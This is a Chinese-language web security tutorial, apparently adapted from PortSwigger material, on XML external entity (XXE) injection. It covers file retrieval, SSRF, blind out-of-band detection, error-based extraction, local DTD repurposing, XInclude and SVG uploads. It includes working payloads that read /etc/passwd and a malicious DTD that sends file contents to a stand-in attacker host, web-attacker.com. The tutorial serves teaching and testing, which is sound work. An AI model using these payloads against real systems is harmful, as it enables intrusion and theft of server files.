### XML external entitiy injection

XML外部实体注入允许攻击者干扰应用程序对XML数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。

在某些情况下，攻击者可以通过利用XXE漏洞执行服务端请求伪造（SSRF）攻击来升级XXE攻击，从而破坏基础服务器或其他后端基础结构。

### How do XXE vulnerabilities arise?

某些应用程序使用XML格式在浏览器和服务器之间传输数据。执行此操作的应用程序几乎总是使用标准库或平台API来处理服务器上的XML数据。XXE漏洞的出现是因为XML规范包含各种潜在危险的功能，而标准分析器支持这些功能，即使应用程序通常不使用它们。

>**Read more**
>
>[了解XML格式、DTD和外部实体](https://portswigger.net/web-security/xxe/xml-entities)
>
>XML代表“”extensible markup language“.XML是一种专为存储和传输数据而设计的语言。与HTML一样，XML使用标记和数据的树状结构。与HTML不同，XML不使用预定义的标记，因此可以为标记指定描述数据的名称。在Web历史的早期，XML作为一种数据传输格式很流行（”AJAX“中的x代表XML）。但它的受欢迎程度现在已经下降，取而代之的是json格式。
>
>**什么是XML实体？**
>
>XML实体是一种在XML文档中表示数据项的方法，而不是使用数据本身。各种实体都内置于XML语言的规范中。例如，实体`&lt;`和表示字符`<`和`>` `&gt;` 这些是用于表示XML标记的元字符，因此当它们出现在数据中时，通常必须使用其他实体来表示。
>
>**什么是文档类型定义**
>
>XML文档类型定义（DTD）包含的声明，这些声明可以定义XML文档的结构、它可以包含的数据值类型以及其他项。DTD在XML文档开头的可选`DOCTYPE`元素中声明。DTD可以完全独立地包含在文档本身中，也可以从其他位置加载（称为”外部DTD“）,也可以是两者的混合。
>
>**什么是XML自定义实体**
>
>XML允许在DTD中定义自定义实体。例如：
>
>```xml-dtd
><!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
>```
>
>此定义意味着XML文档中实体引用`&myentity;`的任何用法都将替换为定义的值：”my entity value“。
>
>**什么是XML外部实体**
>
>XML外部实体是一种自定义实体，其定义位于声明它们的DTD外部。
>
>**外部实体的声明使用关键字`SYSTEM`**,并且必须指定应从加载实体值的URL。例如：
>
>```xml-dtd
><!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
>```
>
>URL可以使用该协议`file://`,因此可以从文件加载外部实体。例如：
>
>```xml-dtd
><!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
>```
>
>XML外部实体提供了XML外部实体攻击产生的主要手段。

### What are the types of XXE attacks?

有多种类型的XXE攻击：

- 利用XXE检索文件，其中定义了一个包含文件内容的外部实体，并在应用程序的响应中返回。
- 利用XXE执行SSRF攻击，其中基于后端系统的URL定义外部实体。
- 利用盲XXE将数据泄露到带外（out-of-band），将敏感数据从应用程序服务器传输到攻击者控制的系统。
- 利用盲XXE通过错误消息检索数据，攻击者可以触发包含敏感数据的解析错误消息。

### Exploiting XXE to retrieve files

要执行从服务器文件系统中检索任意文件的XXE注入攻击，需要通过两种方式修改提交的XML：

- 引入（或编辑）一个`DOCTYPE` 元素，该元素定义包含文件路径的外部实体。
- 编辑应用程序响应中返回的XML中的数据值，以使用定义的外部实体。

例如：假设购物应用程序通过向服务器提交以下XML来检查产品的库存量

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

应用程序没有对XXE攻击执行任何特定防御，因此可以利用XXE漏洞通过提交以下XXE有效负载来检索`/etc/passwd`文件：

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

此XXE有效负载定义一个外部实体，其值是`/etc/passwd`文件的内容，并在`productId`值中使用该实体`&xxe;`。这会导致应用程序的响应包含文件的内容：

```http
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

>对于现实世界的XXE漏洞，提交的XML中通常会有大量数据值，其中任何一个值都可能在应用程序的响应中使用。若要系统地测试XXE漏洞，通常需要**单独测试XML中的每个数据节点**，方法是使用定义的实体并查看它是否出现在响应中。

### Exploiting XXE to perform SSRF attacks

除了检索敏感数据外，XXE攻击的另一个主要影响是它们可用于执行服务端请求伪造SSRF。

要利用 XXE 漏洞执行 SSRF 攻击，需要使用要攻击的 URL 定义外部 XML 实体，并在数据值中使用已定义的实体。如果能在应用程序响应中返回的数据值内使用已定义的实体，那么就能在应用程序响应中查看来自 URL 的响应，从而获得与后端系统的双向交互。否则，就只能执行盲目的 SSRF 攻击（仍可能造成严重后果）。

在以下XXE示例中，外部实体将导致服务器向组织基础结构中的内部系统发出后端HTTP请求：

```xml-dtd
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

### Blind XXE vulnerabilities

许多XXE漏洞实例都是盲注。这意味着应用程序不会在其响应中返回任何已定义的外部实体的值，因此无法直接检索服务器端文件。

XXE盲注仍然可以被检测和利用，但需要更先进的技术。有时可以使用带外技术（out-of-band）来查找漏洞并利用它们来泄露数据。有时，可能会触发XML解析错误，从而导致错误消息中的敏感数据泄露。

有两种广泛使用的方法查找和利用XXE盲注：

- 触发带外（out-of-band）网络交互，有时会泄露交互数据中的敏感数据。
- 触发XML分析错误，使错误消息包含敏感数据

#### Detecting blind XXE using out-of-band（OAST）techniques

通常，您可以使用与XXE SSRF攻击相同的技术来检测XXE盲注，但会触发与所控制系统的带外（out-of-band）网络交互。

```xml-dtd
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

然后，您将在XML中的数据值中使用定义的实体。

此XXE攻击会导致服务器向指定的URL发出后端HTTP请求。攻击者可以监视生成的**DNS查找和HTTP请求**，从而检测XXE攻击是否成功。

有时，由于应用程序的某些输入验证或正在使用的 XML 解析器的某些加固，使用常规实体的 XXE 攻击会被阻止。在这种情况下，你也许可以使用 XML **参数实体**来代替。XML 参数实体是一种特殊的 XML 实体，只能在 DTD 的其他地方引用。就目前而言，您只需了解两件事。首先，XML 参数实体的声明包括实体名称前**的百分号字符**：

```xml-dtd
<!ENTITY % myparameterentity "my parameter entity value" >
```

其次，**使用百分号字符**而不是通常的&符号**来引用**参数实体：

```xml-dtd
%myparameterentity;
```

也就是说，可以通过xml参数实体使用带外检测来测试盲XXE，如下所示：

```xml-dtd
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

此XXE payload 声明一个调用`xxe` 的XML参数实体，然后在DTD中使用该实体。这将导致对攻击者域的DNS查询和HTTP请求，以验证攻击是否成功。

### Exploiting blind XXE to exfiltrate data out-of-band

通过out-of-band技术检测 XXE盲注漏洞效果很好，但实际上并没有演示如何利用该漏洞。攻击者真正想要实现的是泄露敏感数据。这可以通过XXE盲注漏洞来实现！但它涉及攻击者在他们控制的系统上托管恶意DTD，然后从带内XXE有效负载中调用外部DTD。

恶意DTD泄露 /etc/passwd 文件内容的示例如下：

>实体编码是以&#开头 ；结尾的

```xml-dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

此DTD执行以下步骤：

- 定义一个名为`file`的XML参数实体，其中包含`/etc/passwd`文件的内容。
- 定义一个名为`eval`的XML参数实体，其中包含另一个名为`exfiltrate`的XML参数实体的动态声明。将通过向攻击者的Web服务器发出HTTP请求来评估该`exfiltrate`实体，该请求包含URL查询字符串中`file`实体的值。
- 使用`eval`实体，这将会导致执行`exfiltrate`实体得到动态声明。
- 使用实体`exfiltrate`，以便通过请求指定的URL来计算其值。

然后，攻击者必须在他们控制的系统上托管恶意DTD，通常是将其加载到他们自己的Web服务器上。例如，攻击者可以能在以下URL上提供恶意DTD：

```url
http://web-attacker.com/malicious.dtd
```

最后，攻击者必须向易受攻击的应用程序提交以下XXE payload

```xml-dtd
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

此XXE payload声明一个调用xxe的XML参数实体，然后在DTD中使用该实体。这将导致XML解析器从攻击者的服务器获取外部DTD并以内联方式解释它。然后执行恶意DTD中定义的步骤，并将/etc/passwd 文件传输到攻击者的服务器。

>此方法可能不适用于某些文件内容，包括 `/etc/passwd` 文件中包含的换行符。这是因为某些 XML 分析器使用 API 提取外部实体定义中的 URL，该 API 验证允许在 URL 中显示的字符。在这种情况下，可以使用 FTP 协议而不是 HTTP。有时，无法泄露包含换行符的数据，因此可以改为以 等 `/etc/hostname` 文件为目标。

### Exploiting blind XXE to retrieve data via error messages

利用XXE盲注的另一种方法是触发XML解析错误，其中**错误信息包含要检索的敏感数据**。如果应用程序在其响应中返回生成的错误消息，这将生效。

可以使用恶意外部DTD触发包含`/etc/passwd` 文件内容的XML解析错误消息

```xml-dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

此DTD执行以下步骤：

- 定义一个名为file的XML参数实体，其中包含`/etc/passwd`文件的内容。
- 定义一个名为eval的XML参数实体，其中包含另一个名为`error`的XML参数实体的动态声明。将通过加载一个不存在的文件来评估该实体，该文件的名称包含该`error` `file`实体的值。
- 使用实体，这会导致执行eval error实体的动态声明。
- 使用实体error，以便通过尝试加载不存在的文件来计算其值，从而生成一条错误消息，其中包含不存在的文件名称，即etc/passwd的内容。

调用恶意外部DTD将导致如下所示的错误信息：

```passwd
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### Exploiting blind XXE by repurposing a local DTD

上述技术适用于外部 DTD，但通常不适用于 `DOCTYPE` 元素中完全指定的内部 DTD。这是因为该技术涉及在另一个参数实体的定义中使用 XML 参数实体。根据 XML 规范，这在外部 DTD 中是允许的，但在内部 DTD 中是不允许的。 （某些分析器可能允许它，但许多分析器不允许。

那么，当带外交互被阻止时，盲目的 XXE 漏洞又如何呢？无法通过带外连接泄露数据，也无法从远程服务器加载外部 DTD。

在这种情况下，由于 **XML 语言规范中的漏洞**，可能仍可能触发包含敏感数据的错误消息。如果文档的 DTD 混合使用内部和外部 DTD 声明，则内部 DTD 可以重新定义在外部 DTD 中声明的实体。发生这种情况时，将放宽对在另一个参数实体的定义中使用 XML 参数实体的限制。

这意味着攻击者可以从内部 DTD 中使用基于错误的 XXE 技术，前提是他们使用的 XML 参数实体正在重新定义在外部 DTD 中声明的实体。当然，如果带外连接被阻止，则无法从远程位置加载外部 DTD。相反，它需要是应用程序服务器本地的外部 DTD 文件。从本质上讲，该攻击涉及调用恰好存在于本地文件系统上的 DTD 文件，并重新调整其用途以重新定义现有实体，从而触发包含敏感数据的解析错误。该技术由Arseniy Sharoglazov首创，并在我们的2018年十大网络黑客技术中排名#7。

例如，假设服务器文件系统上有一个 DTD 文件 `/usr/local/app/schema.dtd` ，并且此 DTD 文件定义了一个名为 `custom_entity` 的实体。攻击者可以通过提交如下所示的混合 DTD 来触发包含 `/etc/passwd` 文件内容的 XML 分析错误消息：

```xml-dtd
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

此 DTD 执行以下步骤：

- 定义一个名为 `local_dtd` 的 XML 参数实体，其中包含服务器文件系统上存在的外部 DTD 文件的内容。
- 重新定义名为 `custom_entity` 的 XML 参数实体，该实体已在外部 DTD 文件中定义。该实体被重新定义为包含已描述的基于错误的 XXE 漏洞，用于触发包含 `/etc/passwd` 文件内容的错误消息。
- 使用 `local_dtd` 实体，以便解释外部 DTD，包括 `custom_entity` 实体的重新定义值。这将导致所需的错误消息。

### Locating an existing DTD file to repurpose

由于此 XXE 攻击涉及重新利用服务器文件系统上的现有 DTD，因此关键要求是找到合适的文件。这其实很简单。由于应用程序返回 XML 分析器引发的任何错误消息，因此只需尝试从内部 DTD 中加载本地 DTD 文件，即可轻松枚举这些文件。

例如，使用 GNOME 桌面环境的 Linux 系统通常有一个位于 `/usr/share/yelp/dtd/docbookx.dtd` 的 DTD 文件。您可以通过提交以下 XXE 有效负载来测试此文件是否存在，如果文件丢失，这将导致错误：

```xml-dtd
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```

在测试了常见 DTD 文件的列表以查找存在的文件后，您需要获取该文件的副本并查看它以查找可以重新定义的实体。由于许多包含 DTD 文件的常见系统都是开源的，因此您通常可以通过 Internet 搜索快速获取文件的副本。

### Finding hidden attack surface for XXE injection

XXE 注入漏洞的攻击面在很多情况下是显而易见的，因为应用程序的正常 HTTP 流量包括包含 XML 格式数据的请求。在其他情况下，攻击面则不那么明显。不过，只要找对地方，就能在不包含任何 XML 的请求中发现 XXE 攻击面。

**某些应用程序接收客户端提交的数据，将其嵌入到服务器端的XML文档中**，然后分析该文档。例如，将客户端提交的数据放入后端SOAP请求中，然后由后端SOAP服务处理该请求。

在这种情况下，无法执行经典的XXE攻击，因为无法控制整个XML文档，因此无法定义或修改元素`DOCTYPE`。但是，您也许可以改用`XInclude`。`XInclude`是XML规范的一部分，它允许从子文档构建XML文档。可以在XML文档中的任何数据值中发起攻击，因此，在仅控制放置在服务器端XML文档中的单个数据项的情况下，可以执行该`XInclude`攻击。‘

若要执行`XInclude`攻击，需要引用XInclude命名空间并提供要包含的文件的路径。

```xml-dtd
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### XXE attacks via file upload

一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用XML或包含XML子组件。基于XML的格式示例包括DOCX等办公文档格式和SVG等图像格式。

例如，应用程序可能允许用户上传图像，并在上传图像后在服务器上处理或验证这些图像。即使应用程序希望接收PNG或JPEG等格式，正在使用的图像处理库也可能支持SVG图像。由于SVG格式使用XML，攻击者可以提交恶意SVG图像，从而达到XXE漏洞的隐藏攻击面。

```svg
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

### XXE attacks via modified content type

大多数POST请求使用由HTML表单生成的默认内容类型，例如`application/x-www-form-urlencoded` 。某些网站希望以这种格式接收请求，**但会容忍其他内容类型**，包括XML。

例如，如果普通请求包含以下内容

```http
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```

然后，您可以提交以下请求，结果相同：

```html
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

如果应用程序允许消息正文中包含XML的请求，并将正文内容解析为XML，则只需将请求重新格式化以使用XML格式，即可到达隐藏的XXE攻击面。

### How to find and test for XXE vulnerabilities

1. Burp suite的Web漏洞扫描程序
2. 手动测试
   - 通过基于已知操作系统文件定义外部实体并在应用程序响应中返回的数据中使用该实体来测试文件检索。
   - 通过基于控制的系统URL定义外部实体，并监视与该系统的交互来测试盲XXE。
   - 通过使用XInclude攻击尝试检索已知的操作系统文件，测试服务器端XML文档中包含用户提供的非XML数据是否容易受到攻击。

>请记住，XML只是一种数据传输格式。请确保还测试任何基于XML的功能是否存在其他漏洞，如XSS和SQL注入。可能需要使用XML转义序列对有效负载进行编码，以避免破坏语法，但也可以使用它来混淆攻击，以绕过薄弱的防御。